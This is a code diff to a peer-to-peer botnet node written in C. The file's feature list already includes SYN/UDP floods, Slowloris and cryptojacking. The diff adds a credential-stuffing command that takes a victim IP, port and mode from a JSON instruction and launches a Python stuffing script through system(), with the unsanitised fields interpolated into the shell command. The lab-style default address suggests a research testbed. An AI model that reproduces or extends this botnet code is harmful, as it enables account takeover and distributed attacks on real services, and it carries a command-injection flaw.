@@ -26,6 +26,7 @@
  *    ✓ Parallel ALPHA=3 iterative lookups via pthreads
  *    ✓ Multiple --bootstrap seeds (up to MAX_SEEDS=16)
  *    ✓ In-process raw-socket SYN/UDP flood, TCP Slowloris, CPU cryptojack
+ *    ✓ cred_stuffing command type (spawns cred_stuffing.py, mirrors bot_agent.c)
  *    ✓ Attack management: stop_all / shutdown command types
  *    ✓ Ring-buffer dedup (256 entries — up from 64)
  *    ✓ Value replication thread (re-stores local values every REPLICATE_SEC)
@@ -1375,6 +1376,53 @@ static void execute_command(KademliaNode *n, const char *cmd_json) {
         a->cpu      = json_float(cmd_json, "cpu",      0.25);
         if (a->cpu <= 0.0 || a->cpu > 1.0) a->cpu = 0.25;
         launch_attack(n, "cryptojack", cryptojack_thread, a);
+
+    } else if (strcmp(type, "cred_stuffing") == 0) {
+        /*
+         * Credential stuffing — delegates to cred_stuffing.py (same as bot_agent.c).
+         * The Python module handles all three modes (bot / jitter / distributed)
+         * and the CV timing analysis; the C node just spawns the subprocess.
+         *
+         * JSON fields:
+         *   "target"   : victim IP  (default 192.168.100.20)
+         *   "port"     : HTTP port  (default 80)
+         *   "duration" : seconds    (default 120)
+         *   "mode"     : "bot" | "jitter" | "distributed"  (default "jitter")
+         *   "jitter"   : jitter ms  (default 200, only used in jitter mode)
+         *   "workers"  : thread cnt (default 3,  only used in distributed mode)
+         */
+        char target[64] = "192.168.100.20";
+        char mode[32]   = "jitter";
+        int  port       = 80;
+        int  duration   = 120;
+        int  jitter_ms  = 200;
+        int  workers    = 3;
+
+        json_str(cmd_json, "target", target, sizeof(target));
+        json_str(cmd_json, "mode",   mode,   sizeof(mode));
+        port      = json_int(cmd_json, "port",     port);
+        duration  = json_int(cmd_json, "duration", duration);
+        jitter_ms = json_int(cmd_json, "jitter",   jitter_ms);
+        workers   = json_int(cmd_json, "workers",  workers);
+
+        char cmd[512];
+        if (strcmp(mode, "distributed") == 0) {
+            snprintf(cmd, sizeof(cmd),
+                     "python3 cred_stuffing.py"
+                     " --mode distributed"
+                     " --host %s --port %d"
+                     " --workers %d &",
+                     target, port, workers);
+        } else {
+            snprintf(cmd, sizeof(cmd),
+                     "python3 cred_stuffing.py"
+                     " --mode %s"
+                     " --host %s --port %d"
+                     " --interval 500 --jitter %d &",
+                     mode, target, port, jitter_ms);
+        }
+        printf("[P2P] Spawning cred_stuffing: %s\n", cmd);
+        system(cmd);
 
     } else if (strcmp(type, "stop_all") == 0) {
         stop_all_attacks(n);
